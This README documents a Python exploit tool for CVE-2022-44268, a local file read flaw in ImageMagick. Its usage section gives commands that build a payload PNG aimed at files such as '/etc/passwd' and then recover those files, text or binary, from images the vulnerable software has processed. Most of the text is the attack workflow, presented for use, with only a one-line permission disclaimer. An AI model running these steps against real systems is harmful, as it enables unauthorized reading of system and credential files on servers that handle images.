
# LFI imageMagick [CVE-2022-44268] Easy way to read large files and small files

## Description

This script is a simple way to read large and small files using the CVE-2022-44268 vulnerability in ImageMagick. You can use this script to read the content of a file as UTF-8 text or read and create a binary file like a .zip .db .jpg etc.

## Prerequisites

- Python 3.x
- ImageMagick installed and configured (required for the `identify` command)
- You also need generate.py file from the repository <https://github.com/Sybil-Scan/imagemagick-lfi-poc>

### Usage

First, you need to generate the payload using the **generate.py**.

python3 generate.py -f <file_to_read> -o <output_file>

```text
python3 generate.py -f "/etc/passwd" -o payload.png
```

Run the script **readermagick** from the command line with the following command:

```text
python readermagick.py <image_file_name> [-v]
```

- Replace `<image_file_name>` with the path to the image file you want to process.
- The optional `-v` flag can be used to print the content as UTF-8 text instead of creating a binary file.

## Example

To extract the infomation from the example.png file and create a binary file with the content:

```text
python readermagick.py example.png
```

To process the same image file and print the content as UTF-8 text:

```text
python readermagick.py example.png -v
```

## Notes

it is recommended to read the original PoC from Sybil Security to understand how to use the `generate.py` script and the `identify` command.  
Only use this script on systems you own or have permission to test. Unauthorized access to files is illegal and unethical.

## Acknowledgements

- [Sybil Security](https://github.com/Sybil-Scan) for the original PoC and the CVE-2022-44268 vulnerability discovery.
- ChatGPT
